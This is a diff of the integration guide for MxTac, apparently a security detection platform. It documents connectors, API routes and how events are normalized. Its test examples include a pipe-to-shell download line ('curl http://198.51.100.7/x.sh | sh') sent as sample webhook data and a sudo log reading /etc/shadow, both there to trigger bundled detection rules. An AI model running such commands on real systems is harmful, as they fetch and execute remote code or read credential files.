@@ -1,241 +1,224 @@
-# MxTac — Data Source Integration Guide
+# Source integration guide
 
-## Overview
+MxTac has five source types. All five feed the detection pipeline: their events are normalized to OCSF, stored, searchable in Hunt and evaluated by Sigma rules.
 
-MxTac ingests security events from NDR, EDR, SIEM, and cloud sources. This guide covers how to connect each source type.
+| Type | Input | Normalizer |
+|------|-------|------------|
+| `wazuh` | Polls the Wazuh manager REST API | `services/normalizers/wazuh.py` |
+| `zeek` | Reads Zeek log files from a directory | `services/normalizers/zeek.py` |
+| `suricata` | Reads the Suricata EVE JSON file | `services/normalizers/suricata.py` |
+| `syslog` | Listens for syslog messages | `services/normalizers/syslog.py` |
+| `generic` | Receives JSON over HTTP (webhook) | `services/normalizers/webhook.py` |
 
----
+Normalizer paths are relative to `app/backend/app/`.
 
-## NDR Sources
+## Managing connectors
 
-### Suricata
+A connector is a named configuration stored in the database. Create and manage connectors on the **Sources** page or through the API. The `engineer` and `admin` roles can do this.
 
-Suricata IDS/IPS generates EVE JSON logs. MxTac supports two input modes:
+| Action | Route |
+|--------|-------|
+| List | `GET /api/v1/connectors` |
+| Create | `POST /api/v1/connectors` |
+| Update or disable | `PATCH /api/v1/connectors/{id}` |
+| Delete | `DELETE /api/v1/connectors/{id}` |
+| Test the connection | `POST /api/v1/connectors/{id}/test` (Wazuh, Zeek and Suricata) |
+| Health and counters | `GET /api/v1/connectors/{id}/health` |
+| Start, stop | `POST /api/v1/connectors/{id}/start`, `POST /api/v1/connectors/{id}/stop` |
 
-#### Option A: Local File (Suricata on same host)
+Create request:
 
+```json
+{
+  "name": "wazuh-main",
+  "connector_type": "wazuh",
+  "enabled": true,
+  "config": { }
+}
 ```
-Input Mode: Local File
-EVE JSON Path: /var/log/suricata/eve.json
-Poll Interval: 10 seconds
+
+`config` holds the settings from the sections below. Enabled connectors start with the backend. Connector settings are stored in the database without encryption. A name can be used once; a second connector with the same name is refused with `409`.
+
+A new installation has no connectors. The Sources page and the source status card on the Overview page stay empty until you add one.
+
+File-based connectors (Zeek, Suricata) read paths **inside the backend container**. Mount the log directory into the container, for example in `app/docker-compose.yml`:
+
+```yaml
+  backend:
+    volumes:
+      - ./backend:/app
+      - /var/log/suricata:/var/log/suricata:ro
+      - /opt/zeek/logs/current:/opt/zeek/logs/current:ro
 ```
 
-MxTac reads the EVE JSON file directly and parses alerts, flows, DNS, HTTP, TLS events.
+Read positions for Zeek and Suricata files are saved under `/var/lib/mxtac` in the container (override with the `MXTAC_STATE_DIR` environment variable). Mount a volume there to keep positions across container re-creation.
 
-#### Option B: Remote ELK (Suricata logs in Elasticsearch/OpenSearch)
+## Wazuh
 
-If Suricata logs are already collected by your ELK stack (Filebeat → Logstash → Elasticsearch), MxTac can pull them directly:
+The connector authenticates against the Wazuh manager API with `GET /security/user/authenticate` and then polls `GET /alerts` for alerts newer than the last poll.
 
+| Setting | Required | Default | Description |
+|---------|----------|---------|-------------|
+| `url` | Yes | | Base URL of the Wazuh API, for example `https://wazuh.internal:55000` |
+| `username` | Yes | | Wazuh API user |
+| `password` | Yes | | Password of that user |
+| `verify_ssl` | No | `true` | Set to `false` for a self-signed certificate |
+| `poll_interval_seconds` | No | `60` | Seconds between polls |
+
+After a failed poll the connector retries with a delay that grows from 1 to 60 seconds.
+
+## Zeek
+
+The connector tails Zeek log files and tags each event with the log type. It reads JSON logs and has a basic parser for the tab-separated format.
+
+| Setting | Required | Default | Description |
+|---------|----------|---------|-------------|
+| `log_dir` | Yes | `/opt/zeek/logs/current` | Directory that contains the log files |
+| `log_types` | No | `["conn", "dns", "http", "ssl", "files"]` | Log types to read. Each maps to `<type>.log` |
+| `poll_interval_seconds` | No | `60` | Seconds between reads |
+
+JSON logs are the better-supported format. To enable them in Zeek, load `policy/tuning/json-logs.zeek`.
+
+## Suricata
+
+The connector tails the EVE JSON file. On the first start it begins at the end of the file, so only new events are read. After a log rotation it starts again from the beginning of the new file.
+
+| Setting | Required | Default | Description |
+|---------|----------|---------|-------------|
+| `eve_file` | Yes | `/var/log/suricata/eve.json` | Path to the EVE JSON file |
+| `event_types` | No | `["alert", "dns", "http", "tls"]` | EVE `event_type` values to ingest. Other events are skipped |
+| `poll_interval_seconds` | No | `60` | Seconds between reads |
+
+## Syslog
+
+There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages and publish them to the same queue topic.
+
+**Syslog connector** (a connector of type `syslog`, UDP only):
+
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `host` | `0.0.0.0` | Bind address |
+| `port` | `514` | UDP port |
+| `max_message_size` | `65535` | Larger datagrams are dropped |
+
+**Syslog receiver** (configured with environment variables, UDP and TCP, no connector row needed):
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `SYSLOG_ENABLED` | `false` | Start the receiver with the backend |
+| `SYSLOG_HOST` | `0.0.0.0` | Bind address |
+| `SYSLOG_PORT` | `1514` | Port |
+| `SYSLOG_PROTOCOL` | `udp` | `udp`, `tcp` or `both` |
+| `SYSLOG_MAX_MESSAGE_SIZE` | `65535` | Maximum message size in bytes |
+
+The Compose files do not publish a syslog port. Add a port mapping to the `backend` service, for example `"514:1514/udp"` for the receiver.
+
+### How a syslog message is normalized
+
+| Syslog part | Normalized event |
+|-------------|------------------|
+| Timestamp | Event time. An RFC 3164 timestamp has no year and no time zone; the current year and UTC are assumed |
+| Host name in the message, sender address | `dst_endpoint.hostname`, `dst_endpoint.ip`. This is the host that shows on a detection |
+| Program name and process ID | `process.name`, `process.pid`, and the field `app_name` |
+| Severity 0 to 7 | OCSF severity: 0 to 2 critical, 3 high, 4 medium, 5 low, 6 and 7 informational |
+| Message text | Field `message` |
+| Facility | Fields `facility` and `facility_name` |
+
+Two message families get a more specific event class:
+
+| Message | Event class | Extracted |
+|---------|-------------|-----------|
+| SSH login results (`Failed password for ...`, `Accepted publickey for ...`, `Invalid user ...`) and PAM `authentication failure` | Authentication | User in `actor_user.name`, remote address and port in `src_endpoint` |
+| sudo command log (`alice : TTY=... ; COMMAND=/usr/bin/cat /etc/shadow`) | Process Activity | Command in `process.cmd_line`, program path in `process.path`, invoking user in `actor_user.name` |
+
+Every other message is stored as a Base Event. Rules can still match it through the `message` and `app_name` fields.
+
+Each event names the services `syslog`, the program name in lower case, and `auth` or `cron` for those facilities. Sigma rules with a `logsource.service` use these names.
+
+### Test message
+
+With a syslog port published on 514/udp:
+
+```bash
+echo "<38>$(date -u '+%b %e %H:%M:%S') web01 sshd[2211]: Failed password for root from 203.0.113.5 port 51122 ssh2" \
+  | nc -u -w1 localhost 514
 ```
-Input Mode: Remote ELK
-Elasticsearch URL: https://elk.company.com:9200
-Index Pattern: filebeat-suricata-*
-Username: mxtac-reader
-Password: ********
-```
 
-**Setup on your ELK side:**
+The bundled rule "SSH Failed Password for Root" matches this message and creates a detection on the host `web01`. The event is stored with the time in the message, read as UTC.
 
-1. Create a read-only user for MxTac:
-   ```
-   POST /_security/user/mxtac-reader
+## Generic webhook
+
+1. Create a connector of type `generic` with a token:
+
+   ```json
    {
-     "password": "secure-password",
-     "roles": ["mxtac_reader"]
-   }
-   
-   POST /_security/role/mxtac_reader
-   {
-     "indices": [
-       { "names": ["filebeat-suricata-*"], "privileges": ["read"] }
-     ]
+     "name": "custom-source",
+     "connector_type": "generic",
+     "config": { "webhook_token": "<a long random string>" }
    }
    ```
 
-2. Ensure the index pattern matches where Filebeat stores Suricata logs.
+2. Send events as a JSON object or an array of objects:
 
-3. In MxTac Sources page, select Suricata → Configure → enter your ELK URL, index pattern, and credentials.
+   ```bash
+   curl -X POST http://localhost:15000/api/v1/ingest \
+     -H "X-MxTac-Source: custom-source" \
+     -H "X-MxTac-Token: <the token>" \
+     -H "Content-Type: application/json" \
+     -d '[{"timestamp": "2026-01-01T12:00:00Z", "host": "web01", "user": "alice", "command_line": "curl http://198.51.100.7/x.sh | sh", "message": "Suspicious download"}]'
+   ```
 
-MxTac polls the remote index every 60 seconds for new events matching `event.module: suricata`.
+   The response has the status `202` and reports how many events were accepted: `{"accepted": 1, "rejected": 0}`. Array items that are not JSON objects are counted as rejected.
 
----
+   The bundled rule "Download Piped to Shell" matches this example and creates a detection on the host `web01`.
 
-### Zeek
+| Limit | Value |
+|-------|-------|
+| Body size | 5 MB |
+| Requests per source | 100 per minute |
+| Requests per client IP | 60 per minute (general write limit) |
 
-Zeek produces structured log files (conn.log, dns.log, http.log, etc.).
+`POST /api/v1/ingest/test` checks the source name and token without sending events. The **Sources** page has a "Send test event" card that posts a sample event from the browser.
 
-```
-Input Mode: Local Directory
-Log Directory: /opt/zeek/logs/current
-Poll Interval: 10 seconds
-```
+### How a webhook event is normalized
 
-MxTac watches the directory for new/rotated log files and parses all standard Zeek log types: conn, dns, http, ssl, ssh, smb, rdp, files.
+The normalizer looks for common field names. The first name of a row that is present is used.
 
-**For remote Zeek logs via ELK:**
+| Field names in the event | Normalized event |
+|--------------------------|------------------|
+| `timestamp`, `time`, `@timestamp` | Event time. ISO 8601, or epoch seconds or milliseconds. Without it, the time of receipt |
+| `host`, `hostname` | `dst_endpoint.hostname`, the host that shows on a detection |
+| `user`, `username`, `user_name` | `actor_user.name` |
+| `src_ip`, `source_ip` | `src_endpoint.ip` |
+| `dst_ip`, `dest_ip`, `destination_ip` | `dst_endpoint.ip` |
+| `src_port`, `source_port` | `src_endpoint.port` |
+| `dst_port`, `dest_port`, `destination_port` | `dst_endpoint.port` |
+| `process`, `process_name` | `process.name` |
+| `process_path`, `image`, `exe` | `process.path`, the full path of the program. Sigma conditions on `Image` or `path` use it |
+| `command_line`, `cmd_line`, `commandline`, `command` | `process.cmd_line` |
+| `pid`, `process_id` | `process.pid` |
+| `message`, `msg` | Field `message`, also used as the event summary |
+| `severity`, `level` | Severity. A number from 0 to 5, or a name such as `low`, `warning`, `high`, `critical` |
+| `id`, `event_id` | Event UID |
+| `os`, `os_name` | Operating system of the host. Sigma rules for a `product` such as `linux` or `windows` use it |
+| `service` | Service names for Sigma rules with a `logsource.service` |
 
-Same as Suricata Option B — point MxTac to your Elasticsearch index where Filebeat stores Zeek logs:
+Every other top-level field is kept under its own name, and Sigma rules can reference it. The original object is stored with the event.
 
-```
-Elasticsearch URL: https://elk.company.com:9200
-Index Pattern: filebeat-zeek-*
-```
+| Event content | Event class |
+|---------------|-------------|
+| A process name, a process path or a command line | Process Activity |
+| A source and a destination address | Network Activity |
+| Anything else | Base Event |
 
----
+The name of the connector is kept in the raw event as `unmapped.source`, and Sigma rules can reference it as `source`. The flat field `source` that the Hunt page shows and filters on is the source type (`Webhook`, `Syslog`, `Wazuh`, `Zeek`, `Suricata`), not the connector name.
 
-### MxWatch (Built-in NDR Agent)
+A source that is disabled refuses events and the test request with `403`. Each accepted request adds its number of events to the event count of the source and sets "last seen".
 
-MxWatch is MxTac's built-in NDR agent. Deploy it on network tap points:
+## Checking that events arrive
 
-```bash
-# Install
-curl -L https://github.com/fankh/mxtac/releases/latest/download/mxwatch -o /usr/local/bin/mxwatch
-chmod +x /usr/local/bin/mxwatch
-
-# Configure
-cat > /etc/mxwatch/mxwatch.toml << EOF
-[agent]
-api_endpoint = "https://mxtac.company.com/api/v1/events/ingest"
-api_key = "your-api-key"
-
-[capture]
-interface = "eth0"
-bpf_filter = "not port 22"
-EOF
-
-# Run
-mxwatch --config /etc/mxwatch/mxwatch.toml
-```
-
-MxWatch auto-registers with MxTac and appears on the Sources page as "Connected."
-
----
-
-## EDR Sources
-
-### Wazuh
-
-```
-Wazuh Manager URL: https://wazuh-manager:55000
-Username: wazuh-wui
-Password: ********
-```
-
-MxTac polls the Wazuh API for alerts and agent status.
-
-### Velociraptor
-
-```
-Server URL: https://velociraptor:8889
-API Key: vr-api-...
-```
-
-MxTac connects to Velociraptor's API for artifact results and endpoint data.
-
-### MxGuard (Built-in EDR Agent)
-
-```bash
-curl -L https://github.com/fankh/mxtac/releases/latest/download/mxguard -o /usr/local/bin/mxguard
-chmod +x /usr/local/bin/mxguard
-
-cat > /etc/mxguard/mxguard.toml << EOF
-[agent]
-api_endpoint = "https://mxtac.company.com/api/v1/events/ingest"
-api_key = "your-api-key"
-
-[collectors.process]
-enabled = true
-
-[collectors.file]
-enabled = true
-watch_paths = ["/etc", "/usr/bin"]
-
-[collectors.auth]
-enabled = true
-EOF
-
-mxguard --config /etc/mxguard/mxguard.toml
-```
-
----
-
-## SIEM Sources
-
-### Elastic SIEM / OpenSearch
-
-Forward events from an existing Elasticsearch or OpenSearch cluster:
-
-```
-Cluster URL: https://elasticsearch:9200
-Username: elastic
-Password: ********
-Index Pattern: .siem-signals-*
-```
-
-MxTac reads alerts/signals from the specified index and maps them to MITRE ATT&CK techniques.
-
----
-
-## Cloud Sources
-
-### AWS CloudTrail
-
-```
-S3 Bucket: my-cloudtrail-logs
-AWS Region: ap-northeast-2
-Access Key ID: AKIA...
-Secret Access Key: ********
-```
-
-### Prowler (Cloud Security)
-
-```
-AWS Region: ap-northeast-2
-AWS Profile: default
-Scan Interval: 24 hours
-```
-
----
-
-## Generic Webhook Ingest
-
-Any system can send events to MxTac via webhook:
-
-```bash
-curl -X POST https://mxtac.company.com/ingest \
-  -H "X-MxTac-Source: custom-siem" \
-  -H "X-MxTac-Token: webhook-secret" \
-  -H "Content-Type: application/json" \
-  -d '[{"timestamp": "2026-04-06T12:00:00Z", "alert": "Suspicious login", "src_ip": "1.2.3.4"}]'
-```
-
-Events are normalized to OCSF format and processed through the detection pipeline.
-
----
-
-## API Key Management
-
-Generate API keys for agents and integrations:
-
-```bash
-# Via API
-curl -X POST https://mxtac.company.com/api/v1/auth/api-keys \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"label": "mxwatch-prod", "scopes": ["events:write"]}'
-```
-
-Or via Settings → Users → API Keys in the MxTac UI.
-
----
-
-## Port Reference
-
-| Service | Port | Description |
-|---------|------|-------------|
-| Backend API | 15000 | REST API + event ingest |
-| Frontend | 15001 | Web UI |
-| PostgreSQL | 15002 | Primary database |
-| Valkey (Redis) | 15003 | Cache & queue |
-| OpenSearch | 15004 | Log search & analytics |
-| Syslog (UDP) | 514 | Syslog receiver (optional) |
+1. Open the **Sources** page. A running connector shows its status, event count and when it was last seen. The counts of a polling connector are written after each poll, those of a syslog connector every 5 seconds, and those of a webhook source with each request.
+2. Open **Hunt** and run a search, for example for a word of the message, the host or the user, or with a filter on the source.
+3. Open **Detections**. An event that matches an enabled rule creates a detection. The same rule on the same host creates at most one detection in 5 minutes.
+4. Check the backend log: `docker compose logs -f backend`.
+5. Check the metrics at `/metrics`, for example the counters for ingested events and dead-letter events.
